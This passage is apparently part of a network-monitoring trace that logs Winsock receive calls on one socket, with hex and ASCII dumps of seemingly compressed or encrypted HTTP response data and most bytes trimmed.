+<dump_line offset="&#x24;0000" dump="50 A6 24 11 D7 41 4F A1 07 30 83 DF 71 BC 4D D5 " ascii="P.&#x24;..AO..0..q.M."/>
+<dump_line offset="&#x24;0010" dump="4A A6 10 0F F5 BF AC EF 3B 11 EA 7F FF DF 86 69 " ascii="J.......;..&#x7F;...i"/>
+<dump_line offset="&#x24;0020" dump="14 A9 F2 08 2A EB FC 9C F4 EA 98 14 74 8C F9 8E " ascii="....&#x2A;.......t..."/>
+<dump_line offset="&#x24;0030" dump="EA D1 0D C8 67 D5 3F 24 3A 9C 7A 7C 52 45 39 A3 " ascii="....g.&#x3F;&#x24;:.z&#x7C;RE9."/>
+<dump_line offset="&#x24;0040" dump="69 ED 1C 64 E1 A8 9D F1 44 E9 DC 53 4D B0 53 8E " ascii="i..d....D..SM.S."/>
+<dump_line offset="&#x24;0050" dump="00 20 2C EE C7 6A AD B8 E6 F0 F6 18 00 F3 05 61 " ascii=". ,..j.........a"/>
+<dump_line offset="&#x24;0060" dump="39 B0 8E 13 9C 9A B8 CC FF 82 D0 24 AC F9 6A 7A " ascii="9..........&#x24;..jz"/>
+<dump_line offset="&#x24;0070" dump="95 AB B6 11 2E AA 6A 67 95 5B 2A 2C 49 26 C1 F4 " ascii="......jg.[&#x2A;,I&#x26;.."/>
+<dump_line offset="&#x24;0080" dump="6A 58 9F C1 3C 65 08 74 5F 89 FE BB 82 EC 6B 51 " ascii="jX..&#x3C;e.t_.....kQ"/>
+<dump_line offset="&#x24;0090" dump="8B 8E C4 2D 25 F8 67 E5 35 36 2A 9F 06 D9 24 0F " ascii="...-&#x25;.g.56&#x2A;...&#x24;."/>
+<dump_line offset="&#x24;00A0" dump="8E 1F FA 6E 03 31 C7 46 BF E7 0B B6 76 08 B2 8B " ascii="...n.1.F....v..."/>
+<dump_line offset="&#x24;00B0" dump="E8 93 9C 03 4E B7 A4 AD 55 2B D9 48 33 BA 2B EC " ascii="....N...U&#x2B;.H3.&#x2B;."/>
+<dump_line offset="&#x24;00C0" dump="8D 8D B7 3C A0 AF 31 F6 C7 E3 05 32 18 5D A5 A4 " ascii="...&#x3C;..1....2.].."/>
+<dump_line offset="&#x24;00D0" dump="19 DE 8D EA 7F C8 98 F2 F3 1F C5 F2 DE A2 34 C6 " ascii="....&#x7F;.........4."/>
+<dump_line offset="&#x24;00E0" dump="7B 6C 90 3C 67 13 33 52 AA 12 66 94 90 3B 2E E3 " ascii="&#x7B;l.&#x3C;g.3R..f..;.."/>
+<dump_line offset="&#x24;00F0" dump="36 66 1C 12 36 69 D3 C3 73 87 C3 21 F0 70 22 64 " ascii="6f..6i..s..!.p&#x22;d"/>
+<trimmed_bytes count="616"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="4380" successful="1">
+<dump_line offset="&#x24;0000" dump="1E 31 38 C6 BC 81 75 1E 2E 45 DB 2F 9A EB EF 95 " ascii=".18...u..E./...."/>
+<dump_line offset="&#x24;0010" dump="56 09 BB 45 4F CE 2D CA E2 E9 C3 1E 15 46 F1 DE " ascii="V..EO.-......F.."/>
+<dump_line offset="&#x24;0020" dump="AD 94 5B 5C B7 41 B5 8C FF 9C DC B0 D6 55 2A A3 " ascii="..[\.A.......U&#x2A;."/>
+<dump_line offset="&#x24;0030" dump="8F B3 10 20 57 0B 4B 98 22 F0 DD C2 13 B3 99 CC " ascii="... W.K.&#x22;......."/>
+<dump_line offset="&#x24;0040" dump="1D 8B 3C E7 23 AC 8B 75 D1 49 58 A2 1B 9A D4 D4 " ascii="..&#x3C;.&#x23;..u.IX....."/>
+<dump_line offset="&#x24;0050" dump="64 58 C5 96 3E F1 62 A7 B2 66 D3 E7 93 A7 C9 5E " ascii="dX..&#x3E;.b..f.....&#x5E;"/>
+<dump_line offset="&#x24;0060" dump="53 BF 24 00 08 C6 ED 48 80 66 2F 6A 4B EA 78 09 " ascii="S.&#x24;....H.f/jK.x."/>
+<dump_line offset="&#x24;0070" dump="12 25 52 FE 92 BF E9 E2 D2 AA 54 B8 10 8B 61 2B " ascii=".&#x25;R.......T...a&#x2B;"/>
+<dump_line offset="&#x24;0080" dump="7A A5 CE 66 71 88 4C 3E BF AC 79 B5 F1 54 EE FD " ascii="z..fq.L&#x3E;..y..T.."/>
+<dump_line offset="&#x24;0090" dump="8A 80 AF 2E 15 5F E4 10 DC 32 CC D7 AA F9 7E 6A " ascii="....._...2....&#x7E;j"/>
+<dump_line offset="&#x24;00A0" dump="BA AC 57 5F 57 7F 75 0A EC 00 80 B5 FC B1 67 E6 " ascii="..W_W&#x7F;u.......g."/>
+<dump_line offset="&#x24;00B0" dump="14 E0 F4 0D 6E 36 06 DF 7F CD 74 C1 F1 F1 D3 4C " ascii="....n6..&#x7F;.t....L"/>
+<dump_line offset="&#x24;00C0" dump="D8 F2 12 3A AC C1 BB 6F 48 7B 54 96 7A 07 21 0D " ascii="...:...oH&#x7B;T.z.!."/>
+<dump_line offset="&#x24;00D0" dump="E6 55 77 F4 11 CC C6 51 C9 1B 8F 42 62 3E 18 DC " ascii=".Uw....Q...Bb&#x3E;.."/>
+<dump_line offset="&#x24;00E0" dump="29 A0 70 16 99 77 24 C4 B1 D6 CA 5C 2C 65 8E 21 " ascii="&#x29;.p..w&#x24;....\,e.!"/>
+<dump_line offset="&#x24;00F0" dump="39 78 0E DE F8 84 7F 8E BD 33 28 C0 D6 DC F7 CB " ascii="9x....&#x7F;..3&#x28;....."/>
+<trimmed_bytes count="4124"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="2920" successful="1">
+<dump_line offset="&#x24;0000" dump="30 1C 0B 70 20 29 C8 01 25 6E 3E E4 6E 7D 26 C4 " ascii="0..p &#x29;..&#x25;n&#x3E;.n&#x7D;&#x26;."/>
+<dump_line offset="&#x24;0010" dump="89 4D C2 56 97 B3 66 8E D6 04 F7 35 D8 2C D9 88 " ascii=".M.V..f....5.,.."/>
+<dump_line offset="&#x24;0020" dump="1C E1 96 EF A7 A8 8C 00 81 6F A6 56 0C 96 3D 35 " ascii=".........o.V..=5"/>
+<dump_line offset="&#x24;0030" dump="C4 DC 9C 68 FA 77 D0 0D BC B9 7A 20 2F B7 24 E1 " ascii="...h.w....z /.&#x24;."/>
+<dump_line offset="&#x24;0040" dump="7D BE D3 D7 94 BC E5 27 A6 5F C7 5A 52 82 0F E8 " ascii="&#x7D;......&#x27;._.ZR..."/>
+<dump_line offset="&#x24;0050" dump="D4 D5 AA 44 DE 78 A4 9F 8F 06 67 C9 10 04 92 11 " ascii="...D.x....g....."/>
+<dump_line offset="&#x24;0060" dump="E3 09 93 E1 A5 9E 83 EC CC AA 06 D2 B6 ED 78 43 " ascii="..............xC"/>
+<dump_line offset="&#x24;0070" dump="07 DB 03 AF F6 4B 80 EF C3 09 8B 14 C9 FC B1 2F " ascii=".....K........./"/>
+<dump_line offset="&#x24;0080" dump="0A 1D 64 D6 D5 7A 26 E1 79 D7 F0 EE 78 60 5B 89 " ascii="..d..z&#x26;.y...x&#x60;[."/>
+<dump_line offset="&#x24;0090" dump="34 0F 61 B5 8D AD D9 A8 E1 60 27 24 35 69 8A 1D " ascii="4.a......&#x60;&#x27;&#x24;5i.."/>
+<dump_line offset="&#x24;00A0" dump="8F B1 74 03 67 95 27 AD B5 A0 DE 9F FD 68 39 E0 " ascii="..t.g.&#x27;......h9."/>
+<dump_line offset="&#x24;00B0" dump="8E 5C F6 8A D6 90 C6 B5 46 28 C7 B6 BC CC 8D 32 " ascii=".\......F&#x28;.....2"/>
+<dump_line offset="&#x24;00C0" dump="03 94 9E CC 9E DA D6 B2 2D 13 13 BF 39 00 E4 F1 " ascii="........-...9..."/>
+<dump_line offset="&#x24;00D0" dump="AE 52 ED EA 4A 51 E0 1E F7 F5 53 DE E9 49 AC FD " ascii=".R..JQ....S..I.."/>
+<dump_line offset="&#x24;00E0" dump="EC C7 2D AD F6 3D C1 9A 3B 5A E7 6B 6C D9 41 45 " ascii="..-..=..;Z.kl.AE"/>
+<dump_line offset="&#x24;00F0" dump="B3 83 C4 E8 F7 77 0E F9 27 F0 77 DF 70 E8 6A 55 " ascii=".....w..&#x27;.w.p.jU"/>
+<trimmed_bytes count="2664"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="3568" successful="1">
+<dump_line offset="&#x24;0000" dump="1A C7 E2 E4 FF FA AD CD 77 AE 21 3C 81 97 60 DB " ascii="........w.!&#x3C;..&#x60;."/>
+<dump_line offset="&#x24;0010" dump="C6 10 C6 82 CA BD 79 9B 2E A9 40 F8 5A DD 0A 6A " ascii="......y...&#x40;.Z..j"/>
+<dump_line offset="&#x24;0020" dump="5C 3E 23 22 3F A9 5D C8 FC BC F3 EC 5E 0A E5 DD " ascii="\&#x3E;&#x23;&#x22;&#x3F;.].....&#x5E;..."/>
+<dump_line offset="&#x24;0030" dump="85 A4 A4 24 B5 AC 72 87 D8 54 43 A0 EB 91 24 7F " ascii="...&#x24;..r..TC...&#x24;&#x7F;"/>
+<dump_line offset="&#x24;0040" dump="68 48 CF 64 9F 21 C7 AB 8E 29 35 D8 5B E8 BD 72 " ascii="hH.d.!...&#x29;5.[..r"/>
+<dump_line offset="&#x24;0050" dump="24 FF CE 85 B6 EC 6E 1F E1 5F 50 1E 20 16 CA BC " ascii="&#x24;.....n.._P. ..."/>
+<dump_line offset="&#x24;0060" dump="EA 5F 75 19 A1 D8 7E B1 E9 3D 1B BB DB 39 91 5B " ascii="._u...&#x7E;..=...9.["/>
+<dump_line offset="&#x24;0070" dump="39 77 24 DD 53 03 F5 AB 57 7E 4B 94 68 7A 1D 88 " ascii="9w&#x24;.S...W&#x7E;K.hz.."/>
+<dump_line offset="&#x24;0080" dump="27 B9 FA 69 DE B4 D9 25 8A 58 FD 0C 4A 4B 7A A4 " ascii="&#x27;..i...&#x25;.X..JKz."/>
+<dump_line offset="&#x24;0090" dump="44 1C 23 32 3E BF FB 40 30 EA F3 41 CE D4 B6 BD " ascii="D.&#x23;2&#x3E;..&#x40;0..A...."/>
+<dump_line offset="&#x24;00A0" dump="76 DA 95 8E 7B 7C 19 54 91 2F 47 75 21 37 FF A3 " ascii="v...&#x7B;&#x7C;.T./Gu!7.."/>
+<dump_line offset="&#x24;00B0" dump="EC E8 10 25 C7 01 03 20 F1 18 18 7B A9 0A EB A7 " ascii="...&#x25;... ...&#x7B;...."/>
+<dump_line offset="&#x24;00C0" dump="53 E7 63 9F 72 2E BD E3 6A D9 62 8D 09 25 27 1C " ascii="S.c.r...j.b..&#x25;&#x27;."/>
+<dump_line offset="&#x24;00D0" dump="20 9F 74 C8 5E B2 20 D1 62 2E BE 8F 91 18 A8 A4 " ascii=" .t.&#x5E;. .b......."/>
+<dump_line offset="&#x24;00E0" dump="3A 25 60 84 C7 0C CB 1A 59 43 13 29 19 78 A9 47 " ascii=":&#x25;&#x60;.....YC.&#x29;.x.G"/>
+<dump_line offset="&#x24;00F0" dump="61 46 14 F1 A2 E5 5D A4 0F 51 8D F7 93 45 AA 2B " ascii="aF....]..Q...E.&#x2B;"/>
+<trimmed_bytes count="3312"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="2920" successful="1">
+<dump_line offset="&#x24;0000" dump="1E 1A 61 86 7F 3E 1D DC 97 0E 37 9F D2 D1 2D 1E " ascii="..a.&#x7F;&#x3E;....7...-."/>
+<dump_line offset="&#x24;0010" dump="72 CA 15 BF 08 32 51 D5 25 4B 29 84 99 D6 20 25 " ascii="r....2Q.&#x25;K&#x29;... &#x25;"/>
+<dump_line offset="&#x24;0020" dump="2D A0 AC C3 4E 24 CB 7E 92 35 60 BB 65 5D 74 85 " ascii="-...N&#x24;.&#x7E;.5&#x60;.e]t."/>
+<dump_line offset="&#x24;0030" dump="F5 EF 0D F4 F7 09 36 5B 54 CE 2F 28 2D B0 8D 62 " ascii="......6[T./&#x28;-..b"/>
+<dump_line offset="&#x24;0040" dump="FD 60 67 B9 AB 02 89 7B 6D 8A D6 C1 2D 68 AA DE " ascii=".&#x60;g....&#x7B;m...-h.."/>
+<dump_line offset="&#x24;0050" dump="83 1A 4B DF B7 35 FB 58 48 6F 85 A1 74 3B 14 5D " ascii="..K..5.XHo..t;.]"/>
+<dump_line offset="&#x24;0060" dump="1B 47 B4 E6 81 A8 65 39 A0 66 A1 B0 EC 4D 88 78 " ascii=".G....e9.f...M.x"/>
+<dump_line offset="&#x24;0070" dump="7F FA B7 87 27 5B 6D AA 07 33 57 64 9D 1C 29 92 " ascii="&#x7F;...&#x27;[m..3Wd..&#x29;."/>
+<dump_line offset="&#x24;0080" dump="8D EF 60 D1 08 10 98 4F CB BB 72 35 7C 12 CE E1 " ascii="..&#x60;....O..r5&#x7C;..."/>
+<dump_line offset="&#x24;0090" dump="D6 AE C9 A3 82 F9 9C 73 1B F4 E9 3C 14 C1 04 F2 " ascii=".......s...&#x3C;...."/>
+<dump_line offset="&#x24;00A0" dump="73 5F 45 9F 67 75 24 AA A7 C8 BA 46 9F 8B F2 8F " ascii="s_E.gu&#x24;....F...."/>
+<dump_line offset="&#x24;00B0" dump="FA 65 1B 21 BF 2F 96 18 F5 F5 9D 27 72 18 1C 7F " ascii=".e.!./.....&#x27;r..&#x7F;"/>
+<dump_line offset="&#x24;00C0" dump="73 17 A0 94 3A C4 3A E9 F7 46 F9 02 B9 4B F0 33 " ascii="s...:.:..F...K.3"/>
+<dump_line offset="&#x24;00D0" dump="2A FA B9 D7 AD 5D 13 85 33 7E E3 52 AB 9E 39 7D " ascii="&#x2A;....]..3&#x7E;.R..9&#x7D;"/>
+<dump_line offset="&#x24;00E0" dump="34 03 D9 CD 54 40 FB 50 2E 4E D6 DA 07 CF C7 5D " ascii="4...T&#x40;.P.N.....]"/>
+<dump_line offset="&#x24;00F0" dump="DD 12 DD 2F E9 1E 60 90 29 D3 5D BC A9 AD 9B 81 " ascii=".../..&#x60;.&#x29;.]....."/>
+<trimmed_bytes count="2664"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="972" successful="1">
+<dump_line offset="&#x24;0000" dump="9E BD A4 5C FB 37 71 B7 AF F5 48 07 0F 4D B6 80 " ascii="...\.7q...H..M.."/>
+<dump_line offset="&#x24;0010" dump="47 EF 00 5B BF 7E 23 E4 E0 01 62 78 B3 47 F4 BA " ascii="G..[.&#x7E;&#x23;...bx.G.."/>
+<dump_line offset="&#x24;0020" dump="B1 68 6C 42 E0 5E 5F 4A D2 5D 47 97 3C B5 8E A7 " ascii=".hlB.&#x5E;_J.]G.&#x3C;..."/>
+<dump_line offset="&#x24;0030" dump="79 E5 CF E2 D1 58 92 3E 3C B2 32 25 5D 5A FA 50 " ascii="y....X.&#x3E;&#x3C;.2&#x25;]Z.P"/>
+<dump_line offset="&#x24;0040" dump="07 27 E8 F0 FF CF 2D B2 83 CC 33 52 93 9E 30 BF " ascii=".&#x27;....-...3R..0."/>
+<dump_line offset="&#x24;0050" dump="23 24 F7 3D 91 BE 46 5D C7 E3 58 1E 09 EB 85 6A " ascii="&#x23;&#x24;.=..F]..X....j"/>
+<dump_line offset="&#x24;0060" dump="08 38 32 10 E0 B8 B3 F5 30 18 E9 B0 6F C5 0C 4D " ascii=".82.....0...o..M"/>
+<dump_line offset="&#x24;0070" dump="FC 1D F6 40 18 D7 8C D0 54 5C 4C 14 69 83 F5 02 " ascii="...&#x40;....T\L.i..."/>
+<dump_line offset="&#x24;0080" dump="83 6C E9 EF 13 35 79 A7 C0 D8 49 90 C3 C7 CD C5 " ascii=".l...5y...I....."/>
+<dump_line offset="&#x24;0090" dump="77 28 87 3B E3 AB E1 7A 84 0B 61 BE 4C 46 3C E3 " ascii="w&#x28;.;...z..a.LF&#x3C;."/>
+<dump_line offset="&#x24;00A0" dump="D8 51 CD 74 17 51 04 83 DC 2B 5A F7 5D 55 72 97 " ascii=".Q.t.Q...&#x2B;Z.]Ur."/>
+<dump_line offset="&#x24;00B0" dump="2D 45 0C C2 45 35 6A 79 7E 9F 65 43 08 58 00 CB " ascii="-E..E5jy&#x7E;.eC.X.."/>
+<dump_line offset="&#x24;00C0" dump="81 C4 DE 2C 02 82 55 16 21 52 4E B7 0A 5B 28 1F " ascii="...,..U.!RN..[&#x28;."/>
+<dump_line offset="&#x24;00D0" dump="46 09 90 A7 84 34 A6 C1 1E F0 5B D1 DF EB E1 21 " ascii="F....4....[....!"/>
+<dump_line offset="&#x24;00E0" dump="C8 86 D1 9B F4 ED 99 A8 65 6A B8 94 94 36 C8 9B " ascii="........ej...6.."/>
+<dump_line offset="&#x24;00F0" dump="06 9B 48 B8 81 5A BE BD A1 93 21 92 A2 6E 94 6D " ascii="..H..Z....!..n.m"/>
+<trimmed_bytes count="716"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="16384" successful="1">
+<dump_line offset="&#x24;0000" dump="0D 0A 33 66 66 38 0D 0A 70 03 64 FF 63 6B D1 45 " ascii="..3ff8..p.d.ck.E"/>
+<dump_line offset="&#x24;0010" dump="89 6F 81 77 EC 13 ED 2A 85 A5 54 6F EE E8 41 F7 " ascii=".o.w...&#x2A;..To..A."/>
+<dump_line offset="&#x24;0020" dump="B1 42 46 19 F2 29 18 57 EB 4E D7 BF 3A 4D 94 D7 " ascii=".BF..&#x29;.W.N..:M.."/>
+<dump_line offset="&#x24;0030" dump="04 A7 F5 B6 6F 62 8F 76 95 A9 08 72 47 7E 72 47 " ascii="....ob.v...rG&#x7E;rG"/>
+<dump_line offset="&#x24;0040" dump="8C 19 0A 1F 4B 0E 1B 5C A6 9F D1 32 07 AB DA 01 " ascii="....K..\...2...."/>
+<dump_line offset="&#x24;0050" dump="9D 56 7D B3 98 AA F6 E5 36 78 85 10 FC 00 44 1B " ascii=".V&#x7D;.....6x....D."/>
+<dump_line offset="&#x24;0060" dump="8C 32 B3 71 78 73 A0 2A 7D 46 A5 C3 0F AA 71 A4 " ascii=".2.qxs.&#x2A;&#x7D;F....q."/>
+<dump_line offset="&#x24;0070" dump="43 7E 5B F4 2D 3F 26 A1 73 0C FF AB 52 F5 DB D2 " ascii="C&#x7E;[.-&#x3F;&#x26;.s...R..."/>
+<dump_line offset="&#x24;0080" dump="77 CD 43 CB 59 CF 09 93 D7 FB 51 12 44 71 98 89 " ascii="w.C.Y.....Q.Dq.."/>
+<dump_line offset="&#x24;0090" dump="A4 D3 5E DE CF E6 5A BC 5F 62 86 32 CB 32 93 07 " ascii="..&#x5E;...Z._b.2.2.."/>
+<dump_line offset="&#x24;00A0" dump="A6 20 CF 6F DE D5 FB 1A EE 95 97 5F 34 0D B7 51 " ascii=". .o......._4..Q"/>
+<dump_line offset="&#x24;00B0" dump="9B DD 99 1C 4D B9 1E 45 28 CE 06 EC BE 63 3E 70 " ascii="....M..E&#x28;....c&#x3E;p"/>
+<dump_line offset="&#x24;00C0" dump="25 0C 75 B2 7F FB CD 6B 4D 1D 51 E0 AA 11 C5 F3 " ascii="&#x25;.u.&#x7F;..kM.Q....."/>
+<dump_line offset="&#x24;00D0" dump="EE 57 4B C1 6B 04 CC FE DD 89 01 7E 4C 56 7A 42 " ascii=".WK.k......&#x7E;LVzB"/>
+<dump_line offset="&#x24;00E0" dump="D1 09 86 14 25 82 0C 91 84 4A 05 65 0B BA FA 89 " ascii="....&#x25;....J.e...."/>
+<dump_line offset="&#x24;00F0" dump="C7 CF 4E CA 2F EA 42 EA D2 F8 02 F9 C5 DB FD 70 " ascii="..N./.B........p"/>
+<trimmed_bytes count="16128"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="16392" successful="1">
+<dump_line offset="&#x24;0000" dump="88 15 63 8C CA FE CE 58 70 C3 FA 4D 33 B0 C3 AC " ascii="..c....Xp..M3..."/>
+<dump_line offset="&#x24;0010" dump="B9 3C 7F DE E3 B1 57 8A 41 AF 25 B8 B4 91 23 D5 " ascii=".&#x3C;&#x7F;...W.A.&#x25;...&#x23;."/>
+<dump_line offset="&#x24;0020" dump="E5 B5 11 06 48 A5 04 41 B5 D8 AC 57 29 A1 EA 2F " ascii="....H..A...W&#x29;../"/>
+<dump_line offset="&#x24;0030" dump="67 F4 9E 22 AE F1 31 EB DF 08 6D 41 6C C8 99 F0 " ascii="g..&#x22;..1...mAl..."/>
+<dump_line offset="&#x24;0040" dump="D2 08 9B 01 60 8E BB 2B 0B 4C 4B C0 CC 35 B3 66 " ascii="....&#x60;..&#x2B;.LK..5.f"/>
+<dump_line offset="&#x24;0050" dump="6C 81 E1 EE 27 CA F3 EA 29 5B 5E 49 D1 DF 80 4A " ascii="l...&#x27;...&#x29;[&#x5E;I...J"/>
+<dump_line offset="&#x24;0060" dump="A4 ED 1D 5C 21 B5 6E 9C F5 61 1D B3 52 C8 3B D8 " ascii="...\!.n..a..R.;."/>
+<dump_line offset="&#x24;0070" dump="74 4C AB F7 75 75 DD A0 00 31 AE 73 AE BD 46 A9 " ascii="tL..uu...1.s..F."/>
+<dump_line offset="&#x24;0080" dump="A0 90 70 5E 43 3F 9F 5F F4 7F 39 43 BA AF 20 75 " ascii="..p&#x5E;C&#x3F;._.&#x7F;9C.. u"/>
+<dump_line offset="&#x24;0090" dump="D9 A6 E1 CA DA 93 73 F1 76 FE 94 D9 19 AC 9F 36 " ascii="......s.v......6"/>
+<dump_line offset="&#x24;00A0" dump="A7 97 21 CC 69 64 D9 EB 32 93 C1 64 C1 D4 CC 17 " ascii="..!.id..2..d...."/>
+<dump_line offset="&#x24;00B0" dump="2A 38 A3 E0 EC DE F2 3F FB 0A A0 3A F8 12 3A F8 " ascii="&#x2A;8.....&#x3F;...:..:."/>
+<dump_line offset="&#x24;00C0" dump="F7 17 20 8E 06 FC B4 49 87 3B 54 3A E3 4E 33 08 " ascii=".. ....I.;T:.N3."/>
+<dump_line offset="&#x24;00D0" dump="D7 0F C2 5E BA E1 E6 DC 14 B0 72 DE 36 2C 80 CA " ascii="...&#x5E;......r.6,.."/>
+<dump_line offset="&#x24;00E0" dump="39 C7 DD A9 05 35 A8 24 91 D6 16 A3 65 45 BF 3A " ascii="9....5.&#x24;....eE.:"/>
+<dump_line offset="&#x24;00F0" dump="47 2C F9 14 72 29 54 C3 00 38 24 C5 11 E8 E5 23 " ascii="G,..r&#x29;T..8&#x24;....&#x23;"/>
+<trimmed_bytes count="16136"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="384" successful="1">
+<dump_line offset="&#x24;0000" dump="51 D9 C9 5B 86 D2 78 4F ED EA A0 9D 5F 02 37 4B " ascii="Q..[..xO...._.7K"/>
+<dump_line offset="&#x24;0010" dump="79 96 C0 68 09 FC 0F FA 3A C2 FB FE 1E AD 7A A8 " ascii="y..h....:.....z."/>
+<dump_line offset="&#x24;0020" dump="8A A2 CE 13 9C B6 A0 5D B0 1A 9D 49 9F 2A 13 FF " ascii=".......]...I.&#x2A;.."/>
+<dump_line offset="&#x24;0030" dump="B0 13 1C 80 19 E1 53 15 1A 3A 92 B6 39 59 32 5E " ascii="......S..:..9Y2&#x5E;"/>
+<dump_line offset="&#x24;0040" dump="80 88 71 1E 0C A6 B4 9D AE A5 D6 8D 83 76 43 5B " ascii="..q..........vC["/>
+<dump_line offset="&#x24;0050" dump="98 3C 68 8F C1 EF B8 F8 70 F5 84 7C 93 7D E3 4E " ascii=".&#x3C;h.....p..&#x7C;.&#x7D;.N"/>
+<dump_line offset="&#x24;0060" dump="DF 3D E9 D1 A4 39 85 DE 77 79 FB D9 DD 46 85 A5 " ascii=".=...9..wy...F.."/>
+<dump_line offset="&#x24;0070" dump="A2 AB 07 95 F7 EE 2C CC AF A0 49 DF 9E 20 2F 0D " ascii="......,...I.. /."/>
+<dump_line offset="&#x24;0080" dump="9A EF C4 26 B1 79 0D 33 2F 42 1F 8E 3F D4 8A C2 " ascii="...&#x26;.y.3/B..&#x3F;..."/>
+<dump_line offset="&#x24;0090" dump="86 97 53 D6 A2 F5 1C D5 14 18 04 07 17 A8 91 A6 " ascii="..S............."/>
+<dump_line offset="&#x24;00A0" dump="18 43 10 B8 99 9E 6A E3 00 80 BF 96 4A CE 14 7F " ascii=".C....j.....J..&#x7F;"/>
+<dump_line offset="&#x24;00B0" dump="87 89 DE 8F FB 9B D5 6F B0 65 35 90 5C 3C F9 D8 " ascii=".......o.e5.\&#x3C;.."/>
+<dump_line offset="&#x24;00C0" dump="70 90 A0 53 FF A4 E1 F8 EC 16 75 88 09 C7 30 2C " ascii="p..S......u...0,"/>
+<dump_line offset="&#x24;00D0" dump="7E A1 DE 18 84 16 01 88 7D 03 2B 29 8B 99 FC E7 " ascii="&#x7E;.......&#x7D;.&#x2B;&#x29;...."/>
+<dump_line offset="&#x24;00E0" dump="CE 2E F0 89 E9 50 31 7A 98 C6 B1 68 37 1F F7 91 " ascii=".....P1z...h7..."/>
+<dump_line offset="&#x24;00F0" dump="20 79 FC 49 8D BB D3 4A 7F A4 6C 6A 04 7E 7A FB " ascii=" y.I...J&#x7F;.lj.&#x7E;z."/>
+<trimmed_bytes count="128"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="16392" successful="1">
+<dump_line offset="&#x24;0000" dump="BA D5 61 C1 63 05 11 74 90 4B 0D CF 4A AD A3 63 " ascii="..a.c..t.K..J..c"/>
+<dump_line offset="&#x24;0010" dump="3D A6 D8 60 C4 44 79 4D 2B 9D 88 09 82 36 CE 5C " ascii="=..&#x60;.DyM&#x2B;....6.\"/>
+<dump_line offset="&#x24;0020" dump="C8 08 4F BF 02 DB F4 C0 A0 01 80 44 5B 54 2C D6 " ascii="..O........D[T,."/>
+<dump_line offset="&#x24;0030" dump="B5 3A C9 EB AF 02 37 F0 C2 07 F2 C1 62 2D 35 CA " ascii=".:....7.....b-5."/>
+<dump_line offset="&#x24;0040" dump="88 ED 96 A1 FC BD 61 A1 F7 1F 57 24 5E CF 54 BC " ascii="......a...W&#x24;&#x5E;.T."/>
+<dump_line offset="&#x24;0050" dump="0B E7 8A 35 CA 47 EF D6 78 8F C3 1E 23 CF D9 07 " ascii="...5.G..x...&#x23;..."/>
+<dump_line offset="&#x24;0060" dump="0D BC 26 6D 61 FD C0 AE EF 7B 3B 91 CD E3 AE 07 " ascii="..&#x26;ma....&#x7B;;....."/>
+<dump_line offset="&#x24;0070" dump="95 80 EC 23 B2 C0 D9 4C CF E7 F2 10 6F 20 65 0E " ascii="...&#x23;...L....o e."/>
+<dump_line offset="&#x24;0080" dump="04 26 DE F1 7E A0 09 88 C4 26 76 F0 B4 48 29 A1 " ascii=".&#x26;..&#x7E;....&#x26;v..H&#x29;."/>
+<dump_line offset="&#x24;0090" dump="D8 22 7D CA 7E 0B 8A 15 BF 74 55 01 7D 52 99 1E " ascii=".&#x22;&#x7D;.&#x7E;....tU.&#x7D;R.."/>
+<dump_line offset="&#x24;00A0" dump="7C A8 35 1D A5 E4 A0 DE 9B AD 1E 57 91 E6 B3 E2 " ascii="&#x7C;.5........W...."/>
+<dump_line offset="&#x24;00B0" dump="69 AA 91 B3 B7 F9 C9 AE 96 94 B3 29 EC 0A FD FC " ascii="i..........&#x29;...."/>
+<dump_line offset="&#x24;00C0" dump="8E AC FF 73 61 7A 46 61 59 6A 4A AA 9A DE 91 64 " ascii="...sazFaYjJ....d"/>
+<dump_line offset="&#x24;00D0" dump="8D FD A0 CE 08 D4 46 C1 3E DD DB 60 F7 4B 76 F3 " ascii="......F.&#x3E;..&#x60;.Kv."/>
+<dump_line offset="&#x24;00E0" dump="71 62 10 70 14 D0 CC 3A DF 12 F9 17 AA 8E E4 DE " ascii="qb.p...:........"/>
+<dump_line offset="&#x24;00F0" dump="76 EC 24 74 8F 33 8C 84 BF E5 E6 18 11 AE 38 26 " ascii="v.&#x24;t.3........8&#x26;"/>
+<trimmed_bytes count="16136"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="384" successful="1">
+<dump_line offset="&#x24;0000" dump="D9 06 B2 40 54 F9 03 78 6D 7C 24 06 AA FF 96 1A " ascii="...&#x40;T..xm&#x7C;&#x24;....."/>
+<dump_line offset="&#x24;0010" dump="D8 85 39 26 68 38 ED C9 D5 37 CB 24 2E 14 E5 41 " ascii="..9&#x26;h8...7.&#x24;...A"/>
+<dump_line offset="&#x24;0020" dump="5D 2F 51 73 88 72 EC 02 69 E6 7F 0C D5 65 CA 94 " ascii="]/Qs.r..i.&#x7F;..e.."/>
+<dump_line offset="&#x24;0030" dump="27 F6 FE 24 35 05 F8 80 64 10 21 A2 28 FB 78 DA " ascii="&#x27;..&#x24;5...d.!.&#x28;.x."/>
+<dump_line offset="&#x24;0040" dump="6B 77 AB F7 9B 99 3D C7 71 E3 78 4C A8 E6 92 79 " ascii="kw....=.q.xL...y"/>
+<dump_line offset="&#x24;0050" dump="4D C7 BF 86 87 40 96 04 03 C7 6B D1 9F 7E A2 FD " ascii="M....&#x40;....k..&#x7E;.."/>
+<dump_line offset="&#x24;0060" dump="C5 9E 3B 2E 2A 8F EA A8 C8 43 56 E3 D4 E0 74 EA " ascii="..;.&#x2A;....CV...t."/>
+<dump_line offset="&#x24;0070" dump="1A 52 83 D9 75 18 AF 0D 61 AA B2 0F 2B C1 CF 43 " ascii=".R..u...a...&#x2B;..C"/>
